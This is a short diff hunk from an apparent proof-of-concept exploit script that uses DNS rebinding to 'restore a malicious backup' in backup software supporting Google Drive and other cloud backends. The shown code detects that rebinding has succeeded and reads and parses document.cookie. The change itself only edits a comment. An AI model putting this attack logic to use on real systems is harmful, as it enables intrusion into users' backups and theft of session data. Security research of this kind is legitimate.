@@ -132,7 +132,7 @@ Amazon Cloud Drive & S3, Google Drive, box.com, Mega, hubiC and many others
                     if (tokenData.includes(indextoken) == false) {
                         // We can't see token in response. DNS Rebinding must have taken effect
 
-                        /*Restore 'malicious' backup from Google Drive*/
+                        /*Restore 'malicious' backup from Google Drive or other backends*/
                         cookie = document.cookie;
                         let array = cookie.replace(/%2B/g, "+").replace(/%2F/g, "/")
                             .split('=');
